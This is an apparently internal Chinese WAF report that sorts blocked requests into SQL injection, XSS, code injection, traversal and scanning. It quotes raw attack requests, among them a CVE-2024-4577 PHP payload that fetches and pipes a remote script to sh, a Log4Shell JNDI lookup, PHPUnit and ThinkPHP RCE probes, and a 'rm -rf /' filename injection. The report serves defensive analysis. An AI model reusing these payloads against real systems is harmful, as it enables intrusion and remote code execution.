# WAF 拦截到的攻击行为分类
## SQL 注入
### 定义 ：
攻击者通过在 Web 应用程序的输入字段中插入恶意 SQL 代码，借助 Web 应用的数据库执行漏洞，获取、篡改或删除数据。
### 常见攻击方式 ：
#### 经典 SQL 注入 ：
在输入框中直接注入恶意 SQL 查询语句，如在登录页面的用户名或密码输入框中输入 “‘ OR ‘1’=‘1”，试图绕过登录验证。
#### 盲注 ：
攻击者无法看到 SQL 查询的具体错误信息，但通过反复提交请求并观察应用的响应变化，如响应时间、页面内容差异等，逐步推测数据库结构和数据。
#### 基于时间的盲注 ：
通过控制 SQL 查询的执行时间，根据页面响应时间的长短来间接获知数据库的内容。

例如 
```
POST /cas/adver/system HTTP/1.1
Host: www.pinnenger.com
Referer: https://www.pinnenger.com/cas/login?service=https%3A%2F%2Fwww.pinnenger.com%2Flogin%2Fcas&locale=zh_CN
Content-Type: application/json
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Cookie: JSESSIONID=7be491a6-002d-420c-846b-b5f234fdad6e; locale=DKWUQTeIWZ%F5%27%29%29+and+1%3D0+%3B%0Aselect+md5%281980-11-13%29%2Cmd5%281980-11-13%29+%23+; JSESSIONID=ec7595c7-ea92-4156-a2f9-bca747ab6cff
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
sec-ch-ua-mobile: ?0
Origin: https://www.pinnenger.com
sec-ch-ua-platform: "Windows"
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
X-Requested-With: XMLHttpRequest
X-CSRF-TOKEN: 14021e7f-2d2c-4e4d-8951-e9b0494ace53
Sec-Fetch-Site: same-origin
Content-Length: 2

{}
```

```
POST /cas/adver/uhtkLiIdWE%BF%27%29%29%20and%201=0%20;select%20md5%281974-60-30%29,md5%281974-60-30%29,md5%281974-60-30%29,md5%281974-60-30%29,md5%281974-60-30%29%20%23%20 HTTP/1.1
Host: www.pinnenger.com
Cookie: JSESSIONID=7be491a6-002d-420c-846b-b5f234fdad6e; locale=zh_CN; JSESSIONID=ec7595c7-ea92-4156-a2f9-bca747ab6cff
Sec-Fetch-Dest: empty
Connection: keep-alive
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Origin: https://www.pinnenger.com
sec-ch-ua-platform: "Windows"
Sec-Fetch-Mode: cors
sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
Accept-Encoding: gzip, deflate, br, zstd
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
X-CSRF-TOKEN: 14021e7f-2d2c-4e4d-8951-e9b0494ace53
Sec-Fetch-Site: same-origin
Referer: https://www.pinnenger.com/cas/login?service=https%3A%2F%2Fwww.pinnenger.com%2Flogin%2Fcas&locale=zh_CN
Content-Type: application/json
sec-ch-ua-mobile: ?0
Content-Length: 2

{}
```

```
POST /cas/adver/system HTTP/1.1
Host: www.pinnenger.com
Origin: https://www.pinnenger.com
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Connection: keep-alive
Referer: VtQPMjSnPq�')) and 1=0 ;select md5(2013-30-50),md5(2013-30-50),md5(2013-30-50),md5(2013-30-50),md5(2013-30-50),md5(2013-30-50),md5(2013-30-50),md5(2013-30-50),md5(2013-30-50),md5(2013-30-50),md5(2013-30-50),md5(2013-30-50) #
Accept-Encoding: gzip, deflate, br, zstd
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
X-CSRF-TOKEN: 14021e7f-2d2c-4e4d-8951-e9b0494ace53
Sec-Fetch-Dest: empty
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
Cookie: JSESSIONID=7be491a6-002d-420c-846b-b5f234fdad6e; locale=zh_CN; JSESSIONID=ec7595c7-ea92-4156-a2f9-bca747ab6cff
sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
Content-Type: application/json
Content-Length: 2

{}
```


----

## XSS 注入
### 定义 ：
攻击者将恶意脚本注入到 Web 页面中，当受害者访问该页面时，恶意脚本在用户的浏览器中执行，从而窃取用户敏感信息、劫持用户会话或在页面上展示欺诈性内容。
### 常见攻击类型 ：
#### 存储型 XSS ：
攻击者将恶意脚本存储在服务器端，如在留言板块、数据库中保存恶意脚本，当其他用户访问时，这些脚本会自动执行。
#### 反射型 XSS ：
攻击者通过构造包含恶意脚本的 URL 或请求参数，诱使受害者点击链接，恶意脚本随之被嵌入到请求中并执行。
#### 基于 DOM 的 XSS ：
利用客户端的 JavaScript 代码进行脚本注入，通过修改页面的 DOM 结构，使恶意脚本执行。
例如
```
POST /autodiscover/autodiscover.json HTTP/1.1
Host: www.pinnenger.com:443
Accept: */*
Accept-Encoding: gzip
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

<script>alert(1);+"=</script>
```	


```
POST /menu/stapp HTTP/1.1
Host: www.pinnenger.com:11443
Accept: */*
Accept-Encoding: gzip
Content-Length: 127
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

sid=254&pe=1%2C2%2C3%2C4%2C5&appname=%0D%0A%3C%2Ftitle%3E%3Cscript%3Ealert%28Mutzqlf%29%3B%3C%2Fscript%3E&au=1&username=nsroot
```


```
GET /js/this.map.url;urlFetched[url]||(urlFetched[url]=!0,context.load(this.map.id,url))},check:function(){if(this.enabled&&!this.enabling){var HTTP/1.1
Accept: text/html,application/xhtml+xml,image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash,application/x-ms-application, */*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
Host: www.pinnenger.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36;

```

```

GET /data:image/vnd.microsoft.icon;base64,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 HTTP/1.1
Host: 182.140.209.42:443
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE
Accept: */*
Accept-Encoding: gzip


```


## 代码注入
### 定义 ：
攻击者向应用程序中插入恶意代码文件，使应用程序执行非预期的操作，常见的有命令注入、脚本注入等。

### 常见攻击方式 ：

##### 目录穿越 ：

例如
````
GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1
Host: 182.140.209.42:443
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Connection: keep-alive
````

##### 命令注入 ：
攻击者通过应用程序的输入点，如表单、查询参数等，注入操作系统命令，如果应用程序未对输入进行严格过滤和验证，就可能执行这些恶意命令，导致敏感信息泄露、系统受损等。
例如
文件名字段未过滤特殊字符，提交的payload包含，且后台处理时未做处理可能导致注入的命令被执行
```
test.jpg; rm -rf /
```

##### 脚本注入 ：
例如
```html
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1
Host: 182.140.209.42:443
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Connection: keep-alive
```

```html
POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: 182.140.209.44:443
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 221

<?php shell_exec(base64_decode("WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA=")); echo(md5("Hello CVE-2024-4577")); ?>
```


```
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 182.140.209.44:443
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Connection: keep-alive
Content-Type: text/plain
Content-Length: 33

<?php echo(md5("Hello PHPUnit"));
```


```
GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1
Host: 182.140.209.42:443
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Connection: keep-alive
Content-Type: text/plain
Content-Length: 33

<?php echo(md5("Hello PHPUnit"));

```


```
GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1
Host: 182.140.209.44:443
Accept: */*
Upgrade-Insecure-Requests: 1
User-Agent: Custom-AsyncHttpClient
Connection: keep-alive


```

```
POST /xmlrpc.php HTTP/1.1
Connection: Keep-Alive
Content-Type: text/xml; charset=utf-8
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Length: 682
Host: pinnenger.com

<?xml version="1.0"?><methodCall><methodName>metaWeblog.newPost</methodName><params><param><value><string>1</string></value></param><param><value><string>test01</string></value></param><param><value><string>test01</string></value></param><param><value><struct><member><name>title</name><value><string>0x1c8c5b6a</string></value></member><member><name>description</name><value><string>0x1c8c5b6a</string></value></member><member><name>mt_keywords</name><value><string>0x1c8c5b6a</string></value></member><member><name>mt_excerpt</name><value><string>0x1c8c5b6a</string></value></member></struct></value></param><param><value><boolean>1</boolean></value></param></params></methodCall>


```

```
GET /cas/login/?x=${jndi:ldap://${:-288}${:-166}.${hostName}.uri.d0elrs94tvh4bt7rcf0gazu3gwghwksri.oast.online/a} HTTP/1.1
Host: www.pinnenger.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Connection: close
Accept-Encoding: gzip
```



## 扫描
#### 针对常见接口的扫描 ：
攻击者常对一些常见的 Web 接口进行扫描，如 wordpress 的 wp-admin、openapi 的 /openapi/、通用的 /admin/ /test/ /.env 等，以寻找可利用的漏洞或敏感信息。虽当前产品未使用，但此类扫描行为仍需关注，防止未来业务扩展后产生风险。
```
GET /openapi/v2 HTTP/1.1
user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1
accept: application/json
accept-encoding: gzip, br, deflate
host: 182.140.209.44

```

```
GET /.env.bak HTTP/1.1
user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1
accept: */*
accept-encoding: gzip, br, deflate
host: 182.140.209.44
```


#### 搜索引擎的蜘蛛或其他爬虫 ：
搜索引擎会主动请求 /robot.txt 以了解网站可爬取的范围，但部分扫描脚本也会利用该文件来获取网站信息，存在一定风险。鉴于当前产品无需搜索引擎爬取，可在 WAF 上配置拦截策略，禁止搜索引擎爬虫和恶意扫描脚本的访问，同时设置合理的访问频率限制，防止爬虫对服务器造成过大压力。


```
GET /robots.txt HTTP/1.1
Host: 182.140.209.42:443
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE
Accept: */*
Accept-Encoding: gzip

```

```
GET / HTTP/1.1
Host: www.pingreenmall.com
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```
